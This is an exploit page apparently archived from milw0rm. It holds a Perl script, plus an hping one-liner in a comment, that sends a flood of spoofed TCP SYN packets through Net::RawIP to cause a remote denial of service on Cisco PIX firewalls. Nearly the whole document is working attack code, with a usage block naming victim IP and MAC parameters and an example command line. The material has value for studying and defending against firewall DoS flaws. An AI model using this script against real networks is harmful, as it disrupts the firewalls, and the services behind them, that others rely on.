<html><head><title>Cisco PIX Spoofed TCP SYN Packets Remote Denial of Service Exploit</title></head><pre># The easy way by logic logidev@gmail.com (line 2) untested /str0ke
# hping -c 1 -S -s 31337 -k -b -p 22 10.0.xx.xxx

#!/usr/bin/perl
eval (&quot;use Getopt::Long;&quot;);die &quot;[error] Getopt::Long perl module is not installed \n&quot; if $@;
eval (&quot;use Net::RawIP;&quot;);die &quot;[error] Net::RawIP perl module is not installed \n&quot; if $@;
eval (&quot;use Term::ProgressBar;&quot;);
die &quot;[error] Term::ProgressBar perl module is not installed \n&quot; if $@;
my $VERSION = &quot;0.1&quot;;
print &quot;$0, $PgmName, V $VERSION \n&quot;;
GetOptions ( 
&quot;help&quot; =&gt;\$usage,
&quot;device=s&quot; =&gt; \$device, 
&quot;source=s&quot; =&gt;\$sourceip,
&quot;dest=s&quot;=&gt;\$destip,
&quot;sourcemac=s&quot;=&gt;\$sourcemac,
&quot;destmac=s&quot;=&gt;\$destmac,
&quot;port=n&quot;=&gt; \$tcpport,
);

######################## Config option ####################

my $timeout = &quot;0,1&quot;; # Timeout

if ($usage) {&amp;usage;} 

if (!$device) {
$device= 'eth0'; # Network device
}

if (!$destmac) {print &quot;Dest MAC not found \n&quot;; &amp;usage;}
if (!$sourceip) {print &quot;Source IP not found \n&quot;; &amp;usage;}
if (!$destip) {print &quot;Dest IP not found \n&quot;; &amp;usage;}
if (!$tcpport) {print &quot;TCP port not found \n&quot;; &amp;usage;}

my $syn=&quot;1&quot;; # TCP SYN SET
my $tcpdata = &quot;TEST&quot;; # TCP payload
my $count=0;

######################################################

#Initialize Progres Bar 
my $progress = Term::ProgressBar-&gt;new(32768);
$progress-&gt;minor(0);
$packet = new Net::RawIP;
$packet-&gt; ethnew($device);


if (!$sourcemac) {
$packet -&gt; ethset( dest =&gt; $destmac);
}else { 
$packet -&gt; ethset( source =&gt;$sourcemac, dest =&gt; $destmac);
}



for ($count=0; $count&lt; 65537 ; $count++) {

$packet-&gt;set({

ip =&gt; {
saddr =&gt; $sourceip,
daddr =&gt; $destip 
},

tcp =&gt; {
check =&gt; 0x0010 , # TCP Packet Checksum 0 for auto correct
source =&gt; $count,
dest =&gt; $tcpport,
syn =&gt; $syn,
data =&gt; $tcpdata
}});
$packet-&gt;ethsend($timeout);
#$packet-&gt;send($timeout);

$progress-&gt;update($_);
$count++;
}

sub usage {
print &lt;&lt;EOF ;
This program was originally written in the due course of writing
&quot;Hacking Exposed Cisco Networks: Cisco Security Secrets and Solutions&quot; book.
Tool author - Janis Vizulis, Arhont Ltd. (License GPL-2 ) Please send bugs 
and comments to info@arhont.com 

usage: $0 [ --device=interface ] [--source=IP] [--dest=IP] [--sourcemac=MAC]
[--destmac=MAC] [--port=n]

Options:

--help This message
--device Network interface (defaut set eth0)
--source Victim source IP
--dest Victim destination IP
--sourcemac Victim source MAC
--destmac MAC Address of the gateway
--port TCP port 

Example: ./pixdos.pl --device eth0 --source 192.168.44.10 --dest 192.168.55.111 \
--sourcemac 00:90:27:99:11:b6 --destmac 00:60:27:99:11:b6 --port 22 
EOF

exit shift;
}

# milw0rm.com [2005-11-23]</pre></html>